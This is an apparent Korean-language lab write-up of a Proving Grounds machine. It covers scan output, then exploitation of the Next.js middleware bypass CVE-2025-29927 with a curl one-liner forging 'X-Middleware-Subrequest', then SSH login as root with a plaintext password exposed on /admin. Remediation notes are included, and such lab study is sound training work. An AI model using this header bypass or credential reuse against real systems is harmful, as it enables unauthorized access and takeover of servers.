---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/auth-bypass
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.248.215
ports: [22, 3000]
services: [ssh]
cves: [CVE-2025-29927]
status: solved
manual_tags: true
manual_ports: true
manual_services: true
tech_count: 2
---

> [!info] 요약
> 타겟 `192.168.248.215` · Ubuntu 24.04.1 LTS(커널 6.8.0-58-generic, 호스트명 `nextjs`) · Intermediate · 플래그 1개
> 진입점: 3000 Next.js — 미들웨어가 유일한 인가 장치. CVE-2025-29927(`X-Middleware-Subrequest` 헤더 위조)로 미들웨어 우회 → `/admin`에 평문 노출된 `root:modeling-katja-lad-common` → SSH로 그대로 root
> **권한상승 단계 없음.** 인가 우회 한 방이 곧 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.215

### Initial Access – Next.js 미들웨어 인가 우회로 얻은 평문 root 자격증명을 SSH로 재사용

**Vulnerability Explanation:**
- Next.js 앱의 유일한 인가 장치가 루트 `middleware.ts`이고, `/admin` 페이지 컴포넌트 자체에는 세션 검사가 없음 — 미들웨어를 지나면 그대로 렌더됨
- CVE-2025-29927(GHSA-f82v-jwr5-mffw, CVSS 9.1) — 미들웨어 재귀 호출 방지용 내부 표식 `x-middleware-subrequest` 헤더를 실행기가 발신자 검증 없이 신뢰. 외부 요청이 이 헤더를 위조하면 미들웨어 실행이 통째로 스킵됨
- 우회로 도달한 `/admin`이 `root:modeling-katja-lad-common`을 평문 렌더링. 애플리케이션 비밀이 OS `root` 계정 비밀번호와 같고 SSH가 비밀번호 root 로그인을 허용해, 인가 우회 1건이 곧 시스템 전체 장악으로 직결됨

**Vulnerability Fix:**
- Next.js를 패치 버전(15.2.3 / 14.2.25 / 13.5.9 / 12.3.5 이상)으로 업그레이드. 리버스 프록시가 있다면 `x-middleware-subrequest`를 외부 유입 시 제거하는 것으로 임시 완화
- 인가 검사를 미들웨어가 아니라 자원을 내주는 라우트 핸들러(`getServerSideProps`/API 라우트) 안에 재배치
- 관리 페이지에 평문 크리덴셜 렌더링 금지. `PermitRootLogin no` + 공개키 전용 SSH

**Severity:** Critical — 무인증 원격 인가 우회가 CVSS 9.1이고, 이 박스에서는 즉시 root 계정 탈취로 직결

**Steps to reproduce the attack:**
1. 3000/tcp Next.js 확인(`X-Powered-By: Next.js`). `/admin` 을 헤더 없이 요청해 기준선 확보 — 307 + `location: /unauthorized` 면 앞단 인가가 걸려 있음(이 기준선 응답 자체는 이 박스에서 캡처되지 않음 `[가정]`)
2. `X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware` 헤더를 얹어 `/admin` 재요청
3. 200 응답 본문에서 `root:modeling-katja-lad-common` 획득
4. SSH로 `root` 계정에 그대로 재사용 로그인 → `/root/proof.txt` 확인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.215 | TCP: 22, 3000 |

`-p-`(전 포트)에서도 이 둘뿐. 공격면이 극단적으로 좁아 3000에 걸어야 함.

```text
# Nmap 7.98 scan initiated Wed Aug 19 10:10:24 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.215
Nmap scan report for 192.168.248.215
Host is up (0.086s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     ETag: "yh2nq0gvow1u8"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2384
|     Vary: Accept-Encoding
|     Date: Wed, 19 Aug 2026 01:11:02 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/_next/static/css/6f9a5cffec7d2852.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6f9a5cffec7d2852.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8fa1640cc84ba8fe.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-876326609259083c.js" defer=""></script><script src="/_nex
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     X-Powered-By: Next.js
|     ETag: "14ck9o6y74d1o1"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2161
|     Vary: Accept-Encoding
|     Date: Wed, 19 Aug 2026 01:11:03 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>405: Method Not Allowed</title><meta name="next-head-count" content="3"/><link rel="preload" href="/_next/static/css/6f9a5cffec7d2852.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6f9a5cffec7d2852.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8fa1640cc84ba8fe.js" defer=""></script><script src="/_next/static/
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=8/19%Time=6A8502A7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A1E,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20Next\.js\r\nET
SF:ag:\x20\"yh2nq0gvow1u8\"\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nContent-Length:\x202384\r\nVary:\x20Accept-Encoding\r\nDate:\x20We
SF:d,\x2019\x20Aug\x202026\x2001:11:02\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html><html><head><meta\x20charSet=\"utf-8\"/><meta\x20n
SF:ame=\"viewport\"\x20content=\"width=device-width\"/><meta\x20name=\"nex
SF:t-head-count\"\x20content=\"2\"/><link\x20rel=\"preload\"\x20href=\"/_n
SF:ext/static/css/6f9a5cffec7d2852\.css\"\x20as=\"style\"/><link\x20rel=\"
SF:stylesheet\"\x20href=\"/_next/static/css/6f9a5cffec7d2852\.css\"\x20dat
SF:a-n-g=\"\"/><noscript\x20data-n-css=\"\"></noscript><script\x20defer=\"
SF:\"\x20nomodule=\"\"\x20src=\"/_next/static/chunks/polyfills-42372ed1304
SF:31b0a\.js\"></script><script\x20src=\"/_next/static/chunks/webpack-8fa1
SF:640cc84ba8fe\.js\"\x20defer=\"\"></script><script\x20src=\"/_next/stati
SF:c/chunks/framework-64ad27b21261a9ce\.js\"\x20defer=\"\"></script><scrip
SF:t\x20src=\"/_next/static/chunks/main-876326609259083c\.js\"\x20defer=\"
SF:\"></script><script\x20src=\"/_nex")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,9B1
SF:,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nAllow:\x20GET\r\nAllo
SF:w:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no-store,\x20m
SF:ax-age=0,\x20must-revalidate\r\nX-Powered-By:\x20Next\.js\r\nETag:\x20\
SF:"14ck9o6y74d1o1\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x202161\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x201
SF:9\x20Aug\x202026\x2001:11:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!DO
SF:CTYPE\x20html><html><head><meta\x20charSet=\"utf-8\"/><meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width\"/><title>405:\x20Method\x20N
SF:ot\x20Allowed</title><meta\x20name=\"next-head-count\"\x20content=\"3\"
SF:/><link\x20rel=\"preload\"\x20href=\"/_next/static/css/6f9a5cffec7d2852
SF:\.css\"\x20as=\"style\"/><link\x20rel=\"stylesheet\"\x20href=\"/_next/s
SF:tatic/css/6f9a5cffec7d2852\.css\"\x20data-n-g=\"\"/><noscript\x20data-n
SF:-css=\"\"></noscript><script\x20defer=\"\"\x20nomodule=\"\"\x20src=\"/_
SF:next/static/chunks/polyfills-42372ed130431b0a\.js\"></script><script\x2
SF:0src=\"/_next/static/chunks/webpack-8fa1640cc84ba8fe\.js\"\x20defer=\"\
SF:"></script><script\x20src=\"/_next/static/");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   85.22 ms 192.168.45.1
2   85.19 ms 192.168.45.254
3   85.87 ms 192.168.251.1
4   86.28 ms 192.168.248.215

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 10:11:19 2026 -- 1 IP address (1 host up) scanned in 54.93 seconds
```
— 출처: `~/PG/MiddlewareBypass/nmap.log`

실제로 친 것은 `nnmap 192.168.248.215`(`~/.zsh_history` 2333행) — Kali `~/.zshrc` 의 별칭임. 시험장 Kali 에는 별칭이 없으므로 풀 명령으로 적어 둠. 로그 헤더 줄의 `as:` 가 그 전개형임.

```bash
nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.215
```

`--privileged` 는 로그 헤더에 기록된 그대로임 — `-A` 의 OS 탐지가 raw socket 을 쓰므로 root 권한으로 돌아야 함.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-p-` | 65535 전 포트 | 3000 은 기본 1000 포트에 **포함**돼 이 박스에선 안 놓치나, 고번호 서비스는 통째로 누락 |
| `-sCV` | 기본 NSE + 버전 탐지 | `X-Powered-By: Next.js` 를 못 봄 → 제품 식별 실패 |
| `-Pn` | 핑 스킵 | ICMP 차단 대상을 「호스트 다운」으로 오판 |
| `--min-rate 5000` | 최소 전송률 고정 | 무응답 필터 포트 65533 개를 기다림 |
| `-A` | OS·traceroute | 필수 아님. 이 박스에선 OS 추측이 오히려 오탐을 냄 |

`3000/tcp open ppp?` — `SERVICE` 열은 `nmap-services`의 포트 번호 매핑일 뿐 실제 프로토콜이 아님. `fingerprint-strings`의 실제 HTTP 응답을 봐야 함. nmap OS 추측(`MikroTik RouterOS`·`Linux 4.15–5.19`)은 닫힌 포트가 하나도 없어 지문 채취가 성립하지 않는 상태에서 나온 것이고, 실제와 완전히 다름 — 같은 패턴이 [[Codo]]에도 있음.

버전 판정 독립 근거 2개: ① `X-Powered-By: Next.js` 응답 헤더(nmap 지문 + whatweb 둘 다 확인) ② `/_next/static/...` 자산 경로 관례(feroxbuster로 확인). OS는 ① SSH 배너 `Ubuntu 3ubuntu13.11` ② SSH 로그인 후 MOTD `Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-58-generic)`.

```text
http://192.168.248.215:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.248.215], Script[application/json], X-Powered-By[Next.js]
```
— 출처: `~/PG/MiddlewareBypass/whatweb.txt`

`Server` 헤더가 아예 없고 `X-Powered-By[Next.js]`만 있음 — `nginx`·`cloudflare` 같은 값도, `CF-Ray`·`Via`·`X-Cache`도 없음. 중간 프록시 계층 없이 Next.js가 3000에 직접 노출된 구성임을 이 시점에 확정할 수 있었음.

```bash
┌──(kali㉿kali)-[~/PG/MiddlewareBypass]
└─$ feroxbuster -u http://192.168.248.215:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.248.215:3000/
 🚩  In-Scope Url          │ 192.168.248.215
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       65w     2169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        1l        1w       13c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       20c http://192.168.248.215:3000/_next/static/chunks/ => http://192.168.248.215:3000/_next/static/chunks
200      GET        1l        1w      885c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/_buildManifest.js
200      GET        1l        2w       77c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/_ssgManifest.js
308      GET        1l        1w       12c http://192.168.248.215:3000/application/ => http://192.168.248.215:3000/application
200      GET        1l      102w     6558c http://192.168.248.215:3000/_next/static/chunks/664-fb5491d3140dd9e7.js
200      GET        1l       57w     1635c http://192.168.248.215:3000/profile
200      GET        1l       73w     1697c http://192.168.248.215:3000/_next/static/chunks/pages/index-f1f5166c2b73a744.js
200      GET        1l     2125w   112594c http://192.168.248.215:3000/_next/static/chunks/polyfills-42372ed130431b0a.js
308      GET        1l        1w       35c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/ => http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu
308      GET        1l        1w       13c http://192.168.248.215:3000/_next/static/ => http://192.168.248.215:3000/_next/static
308      GET        1l        1w       26c http://192.168.248.215:3000/_next/static/chunks/pages/ => http://192.168.248.215:3000/_next/static/chunks/pages
308      GET        1l        1w        4c http://192.168.248.215:3000/api/ => http://192.168.248.215:3000/api
200      GET        1l       33w     1430c http://192.168.248.215:3000/_next/static/chunks/webpack-8fa1640cc84ba8fe.js
308      GET        1l        1w        6c http://192.168.248.215:3000/_next/ => http://192.168.248.215:3000/_next
200      GET        1l        9w      471c http://192.168.248.215:3000/_next/static/chunks/pages/_app-87cee5540118d1b4.js
200      GET        3l      182w     7454c http://192.168.248.215:3000/_next/static/css/6f9a5cffec7d2852.css
308      GET        1l        1w       17c http://192.168.248.215:3000/_next/static/css/ => http://192.168.248.215:3000/_next/static/css
200      GET        1l       92w     2212c http://192.168.248.215:3000/logs
200      GET        1l       90w     2211c http://192.168.248.215:3000/reports
200      GET        1l       91w     2223c http://192.168.248.215:3000/settings
200      GET        1l       47w     1868c http://192.168.248.215:3000/_next/static/chunks/pages/logs-e08fbafd4209a311.js
200      GET        1l     2293w   116421c http://192.168.248.215:3000/_next/static/chunks/main-876326609259083c.js
200      GET        1l     2735w   139978c http://192.168.248.215:3000/_next/static/chunks/framework-64ad27b21261a9ce.js
200      GET        1l      115w     2384c http://192.168.248.215:3000/
200      GET        1l       57w     2062c http://192.168.248.215:3000/_next/static/chunks/pages/profile-aebf9cb7e58e98f1.js
200      GET        1l       45w     1863c http://192.168.248.215:3000/_next/static/chunks/pages/reports-38a4bd25a2bb0a76.js
200      GET        1l       46w     1875c http://192.168.248.215:3000/_next/static/chunks/pages/settings-40ca8c5913cdef6d.js
200      GET        1l       62w     1984c http://192.168.248.215:3000/_next/static/chunks/pages/unauthorized-ea91fdd0b13897c5.js
200      GET        1l      107w     2314c http://192.168.248.215:3000/unauthorized
[####################] - 4m    180192/180192  0s      found:29      errors:0
[####################] - 4m    180000/180000  714/s   http://192.168.248.215:3000/  
```
— 출처: 대화형 Kali 세션 캡처(`~/.zsh_history` 2334행에 동일 명령). `~/PG/MiddlewareBypass/` 에 이 스캔의 출력 파일은 없음 — 「관측 없음」이 아니라 「파일로 안 떨궈 세션 캡처가 유일본」인 경우임

29건 중 `/admin`이 없음. 두 번째 줄(`307 ... 13c ... Auto-filtering`)이 원인 — feroxbuster 가 "307 + 본문 13바이트"를 404-유사 응답으로 판정해 자동 필터에 넣었음. 이 필터는 **존재하지 않는 무작위 경로**의 응답으로 만들어지므로, 확정되는 것은 「이 앱은 없는 경로에도 307 을 준다」까지임. `/admin` 의 응답이 같은 `307 / 13바이트` 였다는 것은 **이 박스에서 캡처되지 않았음** — 필터에 걸려 결과에서 사라졌다는 인과는 `[가정]`.

`/unauthorized`(200)가 결과에 남아 "무언가를 차단 중"이라는 신호는 살아 있었음. 자동 필터가 정탐 경로를 숨기는 이 패턴과 대응 절차는 → [[_PLAYBOOK]].

`/admin`을 이 세션에서 정확히 어떤 경로로 특정했는지는 산출물에 기록이 없음 — 관측 없음 `[가정]`. 확인되는 것은 `~/.zsh_history` 2334~2339행이 `feroxbuster` → `searchsploit next` → `searchsploit next.js` → `searchsploit -m 52124` → `cat 52124.txt` → `git clone`(EQSTLab 저장소)으로 이어진다는 순서뿐임. 대상 경로 `/admin` 은 **exploit-db 사본 `52124.txt` 가 아니라** 클론한 저장소의 `poc.sh` 에 하드코딩돼 있음(`52124.txt` 는 메타데이터 헤더뿐이고 PoC 본문은 외부 URL 링크로만 표기됨) — 그 값을 그대로 썼을 가능성이 큼 `[가정]`.

```text
# Exploit Title: Next.js Middleware Bypass Vulnerability (CVE-2025-29927)
# Date: 2025-03-26
# Exploit Author: kOaDT
# Vendor Homepage: https://nextjs.org/
# Software Link: https://github.com/vercel/next.js
# Version: 13.0.0 - 13.5.8 / 14.0.0 - 14.2.24 / 15.0.0 - 15.2.2 / 11.1.4 - 12.3.4
# Tested on: Ubuntu 22.04.5 LTS
# CVE: CVE-2025-29927
# PoC: https://raw.githubusercontent.com/kOaDT/poc-cve-2025-29927/refs/heads/main/exploit.js
# POC GitHub Repository: https://github.com/kOaDT/poc-cve-2025-29927/tree/main
```
— 출처: `~/PG/MiddlewareBypass/52124.txt` (searchsploit -m 52124)

### Initial Access – CVE-2025-29927 `X-Middleware-Subrequest` 헤더 위조

실제로 사용한 익스플로잇 저장소 — `~/PG/MiddlewareBypass/CVE-2025-29927/`는 `https://github.com/EQSTLab/CVE-2025-29927.git`을 클론한 것(`git remote -v`로 확인). `~/.zsh_history` 2339~2347행 순서: `git clone` → `cd CVE-2025-29927` → `ls` → `chmod poc.sh`(모드 인자가 없어 실패) → `chmod 744 poc.sh` → `poc.sh`(경로 없이 실행 시도) → `vi poc.sh` → `./poc.sh` → `ssh root@192.168.248.215`.

`vi poc.sh` 단계에서 실제로 편집이 있었음 — 저장소 HEAD 의 `poc.sh`(`git show HEAD:poc.sh`)는 대상이 `localhost:3000`으로 하드코딩돼 있고, 작업 트리는 `192.168.248.215:3000`으로 바뀐 채 남아 있음. 공개 PoC를 그대로 실행하면 타겟이 아니라 자기 자신을 치는 흔한 함정이고, 이 박스에서 실제로 그 편집이 있었다는 것이 `git diff`로 확정됨 — 상세 → [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]].

```diff
diff --git a/poc.sh b/poc.sh
old mode 100644
new mode 100755
index 0260e16..d33c75a
--- a/poc.sh
+++ b/poc.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl -v "http://localhost:3000/admin" \
-  -H "Host: localhost:3000" \
+curl -v "http://192.168.248.215:3000/admin" \
+  -H "Host: 192.168.248.215:3000" \
   -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
 
```
— 출처: `~/PG/MiddlewareBypass/CVE-2025-29927/` 에서 `git diff`(작업 트리 대 HEAD `7b07a4c`. `poc.sh` 를 마지막으로 건드린 커밋은 `6a176ca`)

`old mode 100644 / new mode 100755` 줄이 히스토리의 `chmod 744 poc.sh` 와 짝을 이룸 — git 은 실행 비트만 기록해 744 를 `100755` 로 적음. 파일 실제 권한은 `-rwxr--r--`.

편집 후 최종 `poc.sh`:
```bash
#!/bin/bash

curl -v "http://192.168.248.215:3000/admin" \
  -H "Host: 192.168.248.215:3000" \
  -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
```
— 출처: `~/PG/MiddlewareBypass/CVE-2025-29927/poc.sh`

⚠️ 같은 디렉터리의 `next15/` 는 **저장소가 딸려 보내는 로컬 재현랩**이지 타겟이 아님. `next15/package.json` 의 `"next": "15.1.7"` 을 타겟 버전으로 읽으면 안 됨.

수동 대안은 별도로 필요 없음 — `poc.sh` 자체가 `curl -H` 한 줄이라 스크립트 없이 손으로 그대로 칠 수 있음. 자동 익스플로잇 도구가 금지되는 시험 조건에서 이 유형이 유리한 이유임. 판정 시 `-L` 은 붙이지 말 것(307 을 따라가 `/unauthorized` 본문을 보고 성공을 실패로 오판함).

값은 미들웨어 모듈 이름(`middleware`)을 `:`로 5회 반복한 것. 왜 이 값이어야 하는지(버전별 후보·15.x의 5회 반복 요건)는 → [[_PLAYBOOK]]. 값이 `middleware` × 5로 통했다는 것은 모듈이 루트 `middleware.ts`라는 것만 확정하고, 5회 반복이 15.x 전용 요건과 구버전의 `includes()` 판정을 동시에 만족시키므로 정확한 버전대는 **미확정** `[가정]`.

실행 결과 — `/admin`에 평문 크리덴셜이 노출됨:

```text
Admin Panel
This is an admin-only section.
root:modeling-katja-lad-common
```

![[Pasted image 20260819111158.png]]

*(화면 내용은 위 텍스트와 한 글자씩 대조해 일치 확인함 — 붙여넣기 시각이 실제 캡처 시각과 같다는 보장은 없음.)*

`root:modeling-katja-lad-common`을 SSH에 그대로 재사용:

```bash
┌──(kali㉿kali)-[~/PG/MiddlewareBypass/CVE-2025-29927]
└─$ ssh root@192.168.248.215
The authenticity of host '192.168.248.215 (192.168.248.215)' can't be established.
ED25519 key fingerprint is: SHA256:GYats4sApIm2CiXiv6CqklOr+LDIDCrer/01h6J9yFg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.248.215' (ED25519) to the list of known hosts.
root@192.168.248.215's password:
Permission denied, please try again.
root@192.168.248.215's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Aug 19 02:13:29 AM UTC 2026

  System load:  0.0               Processes:               155
  Usage of /:   56.8% of 9.75GB   Users logged in:         0
  Memory usage: 18%               IPv4 address for ens192: 192.168.248.215
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

137 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Apr 30 12:53:53 2025 from 192.168.118.6
root@nextjs:~# ls
proof.txt
root@nextjs:~# cat proof.txt
ba5f29a3abb6692d4a1676fc93864d6a
```

`~/.zsh_history` 2347행의 `ssh root@192.168.248.215`가 이 세션임 — 대화형 명령으로 확인됨(zsh 는 대화형 세션에서만 히스토리를 기록하므로, 위 블록의 `┌──(kali㉿kali)` 프롬프트도 같은 근거로 실측임). 첫 비밀번호 시도는 `Permission denied`로 실패하고 두 번째에 통과함(원문에 사유 기록 없음, 오타로 추정 `[가정]`). 프롬프트가 `root@nextjs:~#`로 바뀐 시점이 이미 root — 별도 권한상승이 없는 이유가 여기서 확정됨.

**Local.txt value:** 없음 — 이 박스는 플래그 슬롯이 **1개**임. 근거는 포털 진행도 실측(`MiddlewareBypass(1/1)`, `_AUDIT\portal-진행도-실측-20260820.md`)이고, 이 세션에서 얻은 것은 `/root/proof.txt` 하나임.

⚠️ 바로 위 pty 세션의 `root@nextjs:~# ls` 는 `/root` 만 본 것이라 「user 플래그 파일이 시스템에 없다」의 근거가 되지 못함. `find / -name local.txt` 류 전수 탐색은 이 박스에서 실행되지 않았음 — 관측 없음.

### Privilege Escalation – 없음 (SSH 로그인 자체가 이미 root)

`root@nextjs:~#` 프롬프트가 root 계정을 직접 확정함. 크리덴셜 재사용으로 얻은 SSH 세션이 곧 root라 별도 권한상승 단계가 없음.

`id`·`hostname`·`ls -la /.dockerenv` 같은 반사 확인 명령은 이 박스에서 실행되지 않음(원문·산출물에 관측 없음) — uid=0 확정은 프롬프트 기호(`#`)와 MOTD 배너에 의존함. 컨테이너 여부도 별도 확인 없음. 셸을 잡은 뒤 실제 `middleware.ts`·`package.json`을 읽어 정확한 Next.js 버전과 `matcher` 설정을 확인하는 절차도 이 박스에서 하지 않았고, 타겟이 정지되어 되돌릴 수 없음.

### Post-Exploitation

**Proof.txt value:**
`ba5f29a3abb6692d4a1676fc93864d6a`

증거는 `Initial Access` 상세 재현 절의 SSH pty 세션(`cat proof.txt` 출력). 별도 `proof_root.txt` 파일은 이 박스에서 생성되지 않음 — `whoami; hostname; hostname -I; date; cat` 한 화면 형식은 적용되지 않았고, 원문 세션 캡처가 유일한 증거임.

**남긴 흔적**
- 웹 측 변경 없음 — 헤더 위조로 인가만 우회한 읽기 전용 공격
- Kali `~/.ssh/known_hosts`에 타겟 호스트키 추가(공격자 측, 로컬) — 정리는 `ssh-keygen -R 192.168.248.215`
- SSH 로그인 기록(`root`, Kali 소스 IP) — 랩 인스턴스 Stop/Revert로 소멸
- 리버스셸·리스너 사용 없음(SSH 경로라 아웃바운드 콜백 자체가 불필요)

## 관련

- CVE-2025-29927 — GHSA-f82v-jwr5-mffw, CVSS 9.1, 공식 공지 https://nextjs.org/blog/cve-2025-29927
- 익스플로잇 저장소: https://github.com/EQSTLab/CVE-2025-29927 (사용한 `poc.sh`의 출처)
- exploit-db 52124 — kOaDT PoC, 영향 버전 범위 표기
- [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] — `poc.sh`의 `localhost` 하드코딩 편집 사례
- [[_PLAYBOOK#B-1-45. Next.js 미들웨어 인가 우회 (CVE-2025-29927) — 그리고 앞단 인가 우회 6벡터]] — 기법 카드(버전별 헤더 값·판정법·앞단 인가 우회 6벡터)
- [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]] — feroxbuster auto-filter 가 307 보호 라우트를 숨긴 함정
- [[_PLAYBOOK#A-6-11. 박스 이름·호스트명이 증거 사슬을 대신하면 시험장에서 무너진다]] — 이름 없이 같은 결론에 도달하는 증거 사슬
- [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] — SSH 1회 실패를 크리덴셜 무효로 읽지 말 것
- [[Codo]] — 닫힌 포트 없이 나온 nmap OS 추측(MikroTik RouterOS) 오탐의 같은 패턴
- [[Robust]] — 헤더 기반 접근제어 우회(XFF)의 같은 계열, SQLi로 얻은 자격증명이 OS 계정에 재사용된 것도 동일 패턴
- [[Levram]] · [[Fanatastic]] — 애플리케이션에 평문 노출된 root 비밀번호 → 권한상승 생략
- [[Hub]] — 서비스가 root로 구동돼 권한상승 단계가 없던 패턴
- [[Hawat]] — 인증/인가 우회로 보호 엔드포인트에 도달하는 동일 계열
- [[RubyDome]] · [[Clue]] — 3000번 포트 웹 서비스
- [[_STATUS]] — PG 전수 진행현황
